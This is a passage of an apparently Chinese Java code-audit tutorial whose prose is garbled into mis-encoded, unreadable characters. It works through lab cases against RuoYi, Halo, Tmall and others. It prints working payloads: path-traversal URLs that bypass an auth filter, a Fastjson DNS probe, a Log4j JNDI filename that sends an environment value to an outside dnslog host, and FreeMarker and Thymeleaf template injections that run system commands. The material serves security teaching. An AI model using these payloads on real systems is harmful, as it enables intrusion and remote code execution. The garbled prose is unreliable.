·åœ¨ä¾èµ–ä¸­å…ˆæœç´¢jwtå’Œshiroå…³é”®å­—ï¼Œå‘ç°æ²¡æœ‰</p></li><li><p>ç¿»æ‰¾ç›®å½•çœ‹åˆ°filterç›®å½•ï¼Œå‘ç°æ˜¯è¿‡æ»¤å™¨è®¾ç½®</p></li><li><p>è¿‡æ»¤å™¨æ ¸å¿ƒä»£ç åœ¨doFilteræ–¹æ³•å†…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <br>    <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <br>    <span class="hljs-comment">// 1. å°† ServletRequest/ServletResponse è½¬æ¢ä¸º HttpServletRequest/HttpServletResponse</span><br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>    <br>    <span class="hljs-comment">// 2. è·å–å½“å‰è¯·æ±‚çš„ URL</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>    <br>    <span class="hljs-comment">// 3. æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼ˆsession ä¸­æ˜¯å¦æœ‰ &quot;user&quot; å±æ€§ï¼‰</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>    <br>    <span class="hljs-comment">// 4. å¦‚æœç”¨æˆ·å·²ç™»å½•ï¼Œç›´æ¥æ”¾è¡Œè¯·æ±‚</span><br>    <span class="hljs-keyword">if</span> (userInfo != <span class="hljs-literal">null</span>) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 5. å¦‚æœè¯·æ±‚çš„æ˜¯ç™»å½•é¡µï¼ˆ/login.htmlï¼‰æˆ–æ³¨å†Œé¡µï¼ˆ/register.htmlï¼‰ï¼Œç›´æ¥æ”¾è¡Œ</span><br>    <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>))) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 6. æ£€æŸ¥è¯·æ±‚æ˜¯å¦åœ¨å¿½ç•¥åˆ—è¡¨ï¼ˆignoredListï¼‰ä¸­ï¼Œå¦‚æœæ˜¯åˆ™æ”¾è¡Œ</span><br>    <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>        chain.doFilter(servletRequest, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 7. æ£€æŸ¥è¯·æ±‚æ˜¯å¦åœ¨ç™½åå•ï¼ˆallowUrlsï¼‰ä¸­ï¼Œå¦‚æœæ˜¯åˆ™æ”¾è¡Œ</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>            <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                chain.doFilter(request, response);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 8. å¦‚æœä»¥ä¸Šæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè¯´æ˜ç”¨æˆ·æœªç™»å½•ä¸”è®¿é—®çš„æ˜¯å—ä¿æŠ¤èµ„æºï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µ</span><br>    servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ç™½åå•è¿‡æ»¤ç»•è¿‡é‰´æƒ</p></li><li><p>æŠ“åŒ…ï¼Œåœ¨æ•°æ®åŒ…urlå¤„æ›´æ”¹</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A117.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">/login.html/../account/getAccount     =  /account/getAccount <br>/register.html/../account/getAccount  =  /account/getAccount <br>/a.js/../account/getAccount           =  /account/getAccount  <br>/user/login/../../account/getAccount  =  /account/getAccount <br></code></pre></td></tr></table></figure></li></ul><h4 id="Tumoæ¡ˆä¾‹-Shiro"><a href="#Tumoæ¡ˆä¾‹-Shiro" class="headerlink" title="Tumoæ¡ˆä¾‹(Shiro)"></a>Tumoæ¡ˆä¾‹(Shiro)</h4><ul><li><p>åŒæ ·å…ˆåœ¨ä¾èµ–ä¸­æœç´¢å…³é”®å­—ï¼Œå‘ç°æ­¤æºä»£ç ä½¿ç”¨äº†shiroæ¡†æ¶</p></li><li><p>æŸ¥çœ‹ç‰ˆæœ¬ï¼ŒæŸ¥æ‰¾èµ„æ–™åˆ¤æ–­æ˜¯å¦æœ‰æƒé™ç»•è¿‡æ¼æ´</p></li><li><p>æŸ¥çœ‹ç›®å½•æ‰¾åˆ°shiroé…ç½®æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">tumo.shiro.anon_url=\<br>  /login,/logout,/register,\<br>  /,/about,/p<span class="hljs-comment">/**,/links,/comment/**,/link/list,/article/list,\</span><br><span class="hljs-comment">  /css/**,/js/**,///**</span><br></code></pre></td></tr></table></figure><p>anonä»£è¡¨å¯ä»¥åŒ¿åè®¿é—®(æ— éœ€ç™»å½•)</p></li><li><p>å¯»æ‰¾urlåå¸¦æœ‰&#x2F;**çš„ï¼Œå¯ä»¥åˆ©ç”¨å®ƒè®¿é—®åˆ°å…¶ä»–åœ°å€</p></li></ul><h4 id="FastCMSæ¡ˆä¾‹-JWTé‰´æƒ"><a href="#FastCMSæ¡ˆä¾‹-JWTé‰´æƒ" class="headerlink" title="FastCMSæ¡ˆä¾‹(JWTé‰´æƒ)"></a>FastCMSæ¡ˆä¾‹(JWTé‰´æƒ)</h4><ul><li><p>JwtæŠ€æœ¯é‰´æƒ</p><ul><li>ç”Ÿæˆæ—¶ä½¿ç”¨ç©ºåŠ å¯†ï¼ˆé€»è¾‘ä»£ç é—®é¢˜ï¼‰</li><li>æœåŠ¡ç«¯æœªæ ¡éªŒç­¾åï¼ˆé€»è¾‘ä»£ç é—®é¢˜ï¼‰</li><li>å¯†é’¥é»˜è®¤æœªè¢«ä¿®æ”¹ï¼ˆæ­å»ºåæœªä¿®æ”¹ï¼‰</li><li>å¯†é’¥çˆ†ç ´å¯èƒ½æ€§å¤§ï¼ˆå¯†é’¥è¿‡äºç®€å•ï¼‰</li></ul></li><li><p>å¼€å§‹å®¡è®¡</p></li><li><p>æœç´¢å…³é”®å­—jwtå‘ç°æœ‰åŒ…å¼•ç”¨</p><p>æˆ–ï¼šæ•°æ®åŒ…ä¸­å­˜åœ¨jwtç‰¹å¾ï¼šä¸¤ä¸ªç‚¹å°†tokenåˆ†è§£ä¸ºä¸‰æ®µ</p></li><li><p>æ£€æŸ¥å¯†é’¥æ˜¯å¦ä¿®æ”¹</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A118.png"></p></li><li><p>è¶Šæƒå®ä¾‹ï¼š<a href="https://www.cnblogs.com/thebeastofwar/p/17920565.html">Nacosæ¼æ´å¤ç°æ€»ç»“ - BattleofZhongDinghe - åšå®¢å›­ (cnblogs.com)</a></p></li></ul><h3 id="ç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´åˆ©ç”¨"><a href="#ç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´åˆ©ç”¨" class="headerlink" title="ç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´åˆ©ç”¨"></a>ç¬¬ä¸‰æ–¹ç»„ä»¶æ¼æ´åˆ©ç”¨</h3><ul><li>æ‰¾å­˜åœ¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶(Package Checkeræ’ä»¶)</li><li>æ‰¾ç»„ä»¶åˆ©ç”¨å…¥å£æ¡ä»¶(æ ¹æ®ç½‘ä¸Šå·²çŸ¥æ¼æ´å¤ç°æ¡ä»¶)</li><li>æ‰¾å¯æ§åœ°æ–¹æµ‹è¯•æ£€æµ‹(æ ¹æ®ç½‘ä¸Šå·²çŸ¥æ¼æ´åˆ©ç”¨æ¡ä»¶)</li></ul><h4 id="Tmallæ¡ˆä¾‹-Fastjson"><a href="#Tmallæ¡ˆä¾‹-Fastjson" class="headerlink" title="Tmallæ¡ˆä¾‹(Fastjson)"></a>Tmallæ¡ˆä¾‹(Fastjson)</h4><ul><li><p>åœ¨pom.xmlæ–‡ä»¶ä¸­æ‰¾åˆ°FastJsonçš„ä¾èµ–é¡¹ï¼Œå…¶ç‰ˆæœ¬ä¸º1.2.58</p></li><li><p>æ¼æ´è§¦å‘å‡½æ•°   JSON.parseObject()    JSON.parse()</p><ul><li><code>JSON.parseObject()</code> æ˜¯ FastJSON çš„æ ¸å¿ƒæ–¹æ³•ï¼Œç”¨äº JSON â†’ Java å¯¹è±¡çš„è½¬æ¢ã€‚</li><li>æ¯” <code>JSON.parse()</code>ï¼ˆè¿”å› <code>Object</code>ï¼‰æ›´å¸¸ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥ç›´æ¥æŒ‡å®šç›®æ ‡ç±»å‹ã€‚</li></ul></li><li><p>å…¨å±€æœç´¢å…³é”®å­—åï¼Œç»§ç»­å¯»æ‰¾æœ‰å¯æ§å˜é‡çš„åœ°æ–¹ï¼Œæ‰æœ‰åˆ©ç”¨ç‚¹</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A119.png"></p><p>æ‰¾åˆ°æ­¤ä»£ç å¹¶ä¸”å‘ç°æ­¤å˜é‡å¯æ§ï¼Œç¡®å®šæ­¤å¤„ä¸ºæ¼æ´è§¦å‘ç‚¹</p></li><li><p>æ­å»ºå¥½ç¯å¢ƒåé€šè¿‡ä»£ç å¯ä»¥åˆ¤æ–­æ¼æ´åˆ©ç”¨ç‚¹åœ¨æ·»åŠ å•†å“åŠŸèƒ½å¤„</p></li><li><p>æŠ“å–æ•°æ®åŒ…ï¼Œå°†propertyJsonå‚æ•°æ›´æ”¹ä¸ºpoc</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/liguangyao213/article/details/123929296">Fastjsonååºåˆ—åŒ–å®¡è®¡åŠéªŒè¯_fastjson 1.2.58æ¼æ´-CSDNåšå®¢</a></p><p>ä½¿ç”¨dnså¹³å°ï¼š{â€œ@typeâ€:â€java.net.Inet4Addressâ€,â€valâ€:â€3042zb.dnslog.cnâ€}</p><p>åœ¨å®æ“è¿‡ç¨‹ä¸­æœ‰500æŠ¥é”™</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A120.png"></p><p>åŸå› </p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A121.png"></p><p>è§†é¢‘æ¼”ç¤ºæ—¶å¯ä»¥æ”¶åˆ°è®¿é—®è¯·æ±‚</p><p>åç»­æŸ¥çœ‹æ—¶å‘ç°bpè‡ªå¸¦çš„æµ‹è¯•åœ°å€æ”¶åˆ°äº†è®¿é—®è¯·æ±‚</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A122.png"></p></li></ul><h4 id="Tmall-Log4j-2-10-0"><a href="#Tmall-Log4j-2-10-0" class="headerlink" title="Tmall-Log4j   2.10.0"></a>Tmall-Log4j   2.10.0</h4><ul><li><p>log4jæ¼æ´åŸç†</p><p><a href="https://www.freebuf.com/articles/web/364311.html">ä¸€æ–‡è¯»æ‡‚é¢è¯•å®˜éƒ½åœ¨é—®çš„Log4J2æ¼æ´ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895">log4jæ¼æ´æˆå› å’ŒåŸç†ï¼ˆJNDIå’ŒLDAPï¼‰_ï¼Œ8849ã€‚com-CSDNåšå®¢</a></p><p> Apache log4j2-RCE æ¼æ´æ˜¯ç”±äºLog4j2æä¾›çš„lookupåŠŸèƒ½ä¸‹çš„Jndi &#x3D;&#x3D;Lookup&#x3D;&#x3D;æ¨¡å—å‡ºç°é—®é¢˜æ‰€å¯¼è‡´çš„ï¼Œ&#x3D;&#x3D;è¯¥åŠŸèƒ½æ¨¡å—åœ¨è¾“å‡ºæ—¥å¿—ä¿¡æ¯æ—¶å…è®¸å¼€å‘äººå‘˜é€šè¿‡ç›¸åº”çš„åè®®å»è¯·æ±‚è¿œç¨‹ä¸»æœºä¸Šçš„èµ„æºã€‚è€Œå¼€å‘äººå‘˜åœ¨å¤„ç†æ•°æ®æ—¶ï¼Œå¹¶æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯è¿›è¡Œåˆ¤æ–­ï¼Œå¯¼è‡´Log4j2è¯·æ±‚è¿œç¨‹ä¸»æœºä¸Šçš„å«æœ‰æ¶æ„ä»£ç çš„èµ„æº å¹¶æ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œä»è€Œé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚&#x3D;&#x3D;</p></li><li><p>æœç´¢å…³é”®å­—(è§¦å‘ç‚¹) ï¼šlogger.error  logger.info</p></li><li><p>åœ¨è¯¸å¤šç»“æœä¸­å¯»æ‰¾å¸¦æœ‰å¯æ§å˜é‡çš„</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A123.png"></p><p>å¯ä»¥é€šè¿‡æ›´æ”¹å›¾ç‰‡ä¸Šä¼ çš„æ–‡ä»¶åæ›´æ”¹å‚æ•°å€¼</p></li><li><p>åˆ©ç”¨jndiæ³¨å…¥</p><p><a href="https://xz.aliyun.com/news/11723">JNDIæ³¨å…¥åŸç†åŠåˆ©ç”¨è€ƒç©¶-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://blog.csdn.net/csd_ct/article/details/122916620">log4jæ¼æ´åˆ†æåŠæ€»ç»“_log4jæ¼æ´æ˜¯ä»€ä¹ˆ-CSDNåšå®¢</a></p></li><li><p>ä¸Šä¼ ç®¡ç†å‘˜å¤´åƒå›¾ç‰‡åæŠ“åŒ…ï¼Œæ›´æ”¹æ–‡ä»¶åä¸ºpoc</p><p>filename&#x3D;â€${jndi:ldap:&#x2F;&#x2F;${env:OS}.7ffb7b28.log.dnslog.sbs}â€</p></li><li><p>jndiæ³¨å…¥å·¥å…·ï¼šã€JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jarã€‘</p></li></ul><h4 id="RuoYi-v4-2-0-shiroæ¼æ´åˆ©ç”¨"><a href="#RuoYi-v4-2-0-shiroæ¼æ´åˆ©ç”¨" class="headerlink" title="RuoYi-v4.2.0(shiroæ¼æ´åˆ©ç”¨)"></a>RuoYi-v4.2.0(shiroæ¼æ´åˆ©ç”¨)</h4><h5 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h5><ul><li><p>æœç´¢å…³é”®å­—æŸ¥æ‰¾shiroä¾èµ–é¡¹ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬å· 1.4.2</p></li><li><p>æ‰¾åˆ°æ¼æ´åˆ©ç”¨æ–‡ç« </p></li><li><p>åœ¨æºä»£ç ä¸­ç›´æ¥æŸ¥æ‰¾key</p><ul><li><p>æœç´¢å…³é”®å­—setCipherKeyï¼Œæ‰¾åˆ°shiroå¯†é’¥</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A124.png"></p></li></ul></li><li><p>åœ¨å®æˆ˜ä¸­åˆ©ç”¨å·¥å…·çˆ†ç ´å¯†é’¥ï¼Œå­¦ä¹ ååºåˆ—åŒ–åé€‰æ‹©æŸæ¡æ”»å‡»é“¾ï¼Œå®ç°RCE</p></li><li><p>shiroååºåˆ—åŒ–å·¥å…·ï¼š<a href="https://github.com/Ares-X/shiro-exploit">GitHub - Ares-X&#x2F;shiro-exploit: Shiroååºåˆ—åŒ–åˆ©ç”¨å·¥å…·ï¼Œæ”¯æŒæ–°ç‰ˆæœ¬(AES-GCM)Shiroçš„keyçˆ†ç ´ï¼Œé…åˆysoserialï¼Œç”Ÿæˆå›æ˜¾Payload</a></p></li></ul><h5 id="æƒé™ç»•è¿‡"><a href="#æƒé™ç»•è¿‡" class="headerlink" title="æƒé™ç»•è¿‡"></a>æƒé™ç»•è¿‡</h5><p><a href="https://www.freebuf.com/vuls/231909.html">Shiroæƒé™ç»•è¿‡æ¼æ´åˆ†æï¼ˆCVE-2020-1957ï¼‰ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><ul><li><p>shiroçš„ä¸€èˆ¬è§„åˆ™</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A125.png"></p></li><li><p>æ‰¾åˆ°ShiroConfig.javaæ–‡ä»¶æŸ¥çœ‹å…è®¸åŒ¿åè®¿é—®çš„ç›®å½•</p></li><li><p>æ ¹æ®æ–‡ç« æ„é€ pocæµ‹è¯•</p></li></ul><h4 id="Halo-H2Database"><a href="#Halo-H2Database" class="headerlink" title="Halo(H2Database)"></a>Halo(H2Database)</h4><p><a href="https://www.cnblogs.com/ArcherCY/p/17699288.html">H2 databaseæ¼æ´å¤ç° - Running_J - åšå®¢å›­ (cnblogs.com)</a></p><ul><li><p>æ­å»ºå¥½ç¯å¢ƒè¿›å…¥åå°</p></li><li><p>è®¿é—®é¡µé¢<a href="http://localhost:8090/h2-console">http://localhost:8090/h2-console</a></p></li><li><p>åˆ©ç”¨jndiæ³¨å…¥å·¥å…·ç”Ÿæˆpoc</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A126.png"></p></li><li><p>ä¼ å€¼</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A127.png"></p><p>javax.naming.InitialContext</p><p>æ³¨å…¥ä½¿ç”¨çš„poc</p></li><li><p>å®æ“å¹¶æœªå¼¹å‡ºè®¡ç®—å™¨ï¼ŒçŒœæµ‹æ˜¯jdkç‰ˆæœ¬è¿‡é«˜</p></li><li><p>æ­¤æ¼æ´åˆ©ç”¨è¦æ±‚ï¼šH2 databaseè‡ªå¸¦çš„webç®¡ç†é¡µé¢å…è®¸å¤–éƒ¨ç”¨æˆ·è®¿é—®webç®¡ç†ç•Œé¢ï¼Œä¸”ä¸ç»è¿‡èº«ä»½éªŒè¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è¿™ä¸ªå°±æ˜¯è®¾ç½®å¯ç”¨è¿˜æ˜¯ç¦ç”¨webç®¡ç†ç•Œé¢</span><br>spring.h2.console.enabled=<span class="hljs-literal">true</span><br><span class="hljs-comment">//è¿™ä¸ªå°±æ˜¯è®¾ç½®æ˜¯å¦å…è®¸å¤–éƒ¨ç”¨æˆ·è¿›è¡Œè®¿é—®ç®¡ç†ç•Œé¢ï¼Œå¹¶ä¸é€šè¿‡èº«ä»½éªŒè¯</span><br>spring.h2.console.settings.web-allow-others=<span class="hljs-literal">true</span><br>å¦‚æœè¿™ä¸¤ä¸ªè®¾ç½®é’§å¼€å¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨jndiè¿›è¡Œæ³¨å…¥æ”»å‡»ã€‚<br></code></pre></td></tr></table></figure></li></ul><h3 id="SSTIæ¨¡æ¿æ³¨å…¥"><a href="#SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTIæ¨¡æ¿æ³¨å…¥"></a>SSTIæ¨¡æ¿æ³¨å…¥</h3><ol><li>æ‰¾é¡¹ç›®ä¸­æ˜¯å¦å­˜åœ¨æ¨¡æ¿å¼•æ“(ç±»å‹åŠå®‰å…¨é—®é¢˜)</li><li>æ‰¾æ¨¡æ¿æ³¨å…¥åˆ©ç”¨å…¥å£æ¡ä»¶</li><li>æ‰¾å¯æ§åœ°æ–¹è¿›è¡Œæµ‹è¯•æ£€æµ‹</li></ol><ul><li><p>å¸¸è§æ¨¡æ¿å¼•æ“</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A128.png"></p></li></ul><h4 id="Haloæ¡ˆä¾‹-FreeMarkeræ¨¡æ¿"><a href="#Haloæ¡ˆä¾‹-FreeMarkeræ¨¡æ¿" class="headerlink" title="Haloæ¡ˆä¾‹(FreeMarkeræ¨¡æ¿)"></a>Haloæ¡ˆä¾‹(FreeMarkeræ¨¡æ¿)</h4><p><a href="https://www.cnblogs.com/nice0e3/p/16217471.html">Javaå®‰å…¨ä¹‹freemarker æ¨¡æ¿æ³¨å…¥ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></p><ul><li><p>å…¨å±€æœç´¢å…³é”®å­—freemarker,å‘ç°æºä»£ç ä¸­æœ‰freemarkerçš„é…ç½®</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A129.png"></p><p>å‘ç°FreeMarkerçš„é…ç½®æ–‡ä»¶æ˜¯ .ftlåç¼€   </p></li><li><p>ä¿®æ”¹resources\templates\themes\anatole\index.ftlæ–‡ä»¶</p><p>åŠ å…¥poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ftl">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;whoami&quot;).start()&#125;<br>æˆ–<br>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;test(&quot;calc&quot;)&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ­¤å®¹å™¨ï¼Œæ‰“å¼€é¦–é¡µå‘ç°æœ‰è®¡ç®—æœºå¼¹å‡ºï¼Œæ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤</p></li><li><p>æ¼æ´åˆ©ç”¨</p><ul><li>æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶ä¸­å¯æ§å˜é‡ï¼Œå†™å…¥poc</li></ul></li><li><p>æ­¤æºä»£ç æ²¡æœ‰åˆ©ç”¨å…¥å£</p></li></ul><h4 id="RuoYi-v4-6-0æ¡ˆä¾‹-Thymeleaf"><a href="#RuoYi-v4-6-0æ¡ˆä¾‹-Thymeleaf" class="headerlink" title="RuoYi-v4.6.0æ¡ˆä¾‹(Thymeleaf)"></a>RuoYi-v4.6.0æ¡ˆä¾‹(Thymeleaf)</h4><p><a href="https://xz.aliyun.com/news/9281">Thymeleaf Fragment æ³¨å…¥æ¼æ´å¤ç°åŠæ–°å§¿åŠ¿æ‰©å±•-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><ul><li><p>æœç´¢å…³é”®å­—å‘ç°æ˜¯Thymeleafæ¨¡æ¿</p></li><li><p>æ‰¾å…¥å£(å¯»æ‰¾ä¸æ–‡ç« ä¸­ç±»ä¼¼çš„returnå…¥å£)</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A130.png"></p><p>å­˜åœ¨å¯æ§å˜é‡çš„returnå…¥å£</p></li><li><p>æ‰¾åˆ°è·¯ç”± </p><p><a href="http://localhost:8088/monitor/cache">http://localhost:8088/monitor/cache</a></p></li><li><p>æŠ“å–æ•°æ®åŒ…åæ›´æ”¹å˜é‡fragmentçš„å€¼ï¼Œä¼ å…¥payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">__$&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A131.png"></p><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p></li></ul><h3 id="FastJsonååºåˆ—åŒ–æ¼æ´"><a href="#FastJsonååºåˆ—åŒ–æ¼æ´" class="headerlink" title="FastJsonååºåˆ—åŒ–æ¼æ´"></a>FastJsonååºåˆ—åŒ–æ¼æ´</h3><p><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p><p><a href="https://xz.aliyun.com/news/12174#toc-16">https://xz.aliyun.com/news/12174#toc-16</a> (Javaååºåˆ—åŒ–ä¹‹FastJsonååºåˆ—åŒ–åŠç»•è¿‡)</p><p><a href="https://www.ddosi.org/fastjson-payload/#Fastjson_1222-1224">Fastjsonæ¼æ´åˆ©ç”¨å§¿åŠ¿æŠ€å·§é›†åˆ | Fastjson payload - ğŸ”°é›¨è‹â„’ğŸ”° (ddosi.org)</a></p><h4 id="fastjsonååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#fastjsonååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="fastjsonååºåˆ—åŒ–æ¼æ´åŸç†"></a>fastjsonååºåˆ—åŒ–æ¼æ´åŸç†</h4><ul><li><p>ä½¿ç”¨AutoTypeåŠŸèƒ½è¿›è¡Œåºåˆ—åŒ–çš„JSONå­—ç¬¦ä¼šå¸¦æœ‰ä¸€ä¸ª@typeæ¥æ ‡è®°å…¶å­—ç¬¦çš„åŸå§‹ç±»å‹</p></li><li><p>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¯»å–è¿™ä¸ª@typeï¼Œæ¥è¯•å›¾æŠŠJSONå†…å®¹ååºåˆ—åŒ–åˆ°å¯¹è±¡ï¼Œå¹¶ä¸”ä¼šè°ƒç”¨è¿™ä¸ªåº“çš„setæˆ–è€…getæ–¹æ³•</p></li><li><p>@typeçš„ç±»æœ‰å¯èƒ½è¢«æ¶æ„æ„é€ ï¼Œæ„é€ ä¸€ä¸ªJSONï¼Œä½¿ç”¨@typeæŒ‡å®šä¸€ä¸ªæƒ³è¦çš„æ”»å‡»ç±»åº“å°±å¯ä»¥å®ç°æ”»å‡»ã€‚</p></li><li><p>å¸¸è§çš„æœ‰sunå®˜æ–¹æä¾›çš„ä¸€ä¸ªç±»com.sun.rowset.JdbcRowSetImplï¼Œå…¶ä¸­æœ‰ä¸ªdataSourceNameæ–¹æ³•æ”¯æŒä¼ å…¥ä¸€ä¸ªrmiçš„æºï¼Œåªè¦è§£æå…¶ä¸­çš„urlå°±ä¼šæ”¯æŒè¿œç¨‹è°ƒç”¨ï¼å› æ­¤æ•´ä¸ªæ¼æ´å¤ç°çš„åŸç†è¿‡ç¨‹å°±æ˜¯ï¼š</p><ol><li>æ”»å‡»è€…ï¼ˆæˆ‘ä»¬ï¼‰è®¿é—®å­˜åœ¨fastjsonæ¼æ´çš„ç›®æ ‡é¶æœºç½‘ç«™ï¼Œé€šè¿‡burpsuiteæŠ“åŒ…æ”¹åŒ…ï¼Œä»¥jsonæ ¼å¼æ·»åŠ com.sun.rowset.JdbcRowSetImplæ¶æ„ç±»ä¿¡æ¯å‘é€ç»™ç›®æ 